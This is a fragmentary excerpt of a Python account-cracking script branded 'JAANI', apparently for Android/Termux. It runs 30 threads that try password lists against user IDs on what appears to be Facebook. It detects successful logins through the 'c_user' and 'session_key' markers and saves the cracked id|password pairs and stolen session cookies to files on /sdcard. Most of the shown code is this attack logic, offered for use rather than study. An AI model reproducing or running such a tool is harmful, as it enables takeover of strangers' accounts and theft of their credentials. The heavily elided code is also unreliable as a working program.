...
def auto_file(cookies,access_token):
        ...
        print('\n \033[1;97m /sdcard/JAANI.txt \033[0;97m\n')
                ...
                if "server on" in sj:
                        ...
                        if xd in ['1','01']:
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        print("\033[1;32m OK IDZ SAVED IN >>>>> /SDCARD/JAANI-OK.TXT")

                                        print("\033[1;32m CP IDZ SAVED IN >>>>> /SDCARD/JAANI-CP.TXT")

                                        print("\033[1;32m COOKIE SAVED IN >>>> /SDCARD/JAANI-COOKIE.TXT")
...
def za():
    ...
    if myid in str(body):
        ...
        print(" run again python JAANI.py")
...
def pak():
                ...
                with tred(max_workers=30) as JAANI:     
                        ...
                        for psx in user:
                                ...
                                JAANI.submit(rndm,ids,passlist)
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;37m [JAANI] [%s] \033[1;37m[OK=%s] [%s%%]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
    ...
    'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A',
                        ...
                        JAANI=str(session.cookies)

                        if "c_user" in JAANI:

                                print('\r\r\033[1;32m [JAANI-OK] %s | %s'%(ids,pas))
                                ...
                                open('/sdcard/JAANI-COOKIE.txt','a').write(coki+'\n')

                                open('/sdcard/JAANI-OK.txt', 'a').write(ids+'|'+pas+'\n')

                                oks.append(ids)

                                break

                        elif 'checkpoint' in JAANI:

                                if 'y' in pcp:

                                        print('\r\r\x1b[38;5;208m [JAANI-CP] '+ids+' | '+pas+'\033[1;97m')

                                        open('/sdcard/JAANI-CP.txt', 'a').write(ids+'|'+pas+'\n')
                ...
                try:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        print('\r\r\033[1;32m [JAANI-OK] '+ids+' | '+pas+'\033[1;97m')
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [JAANI-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        ...
                                        open('/sdcard/JAANI-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [JAANI-CP] '+str(uid)+' | '+pas+'\033[1;97m')

                                        open('/sdcard/JAANI-CP.txt','a').write(str(uid)+'|'+pas+'\n')
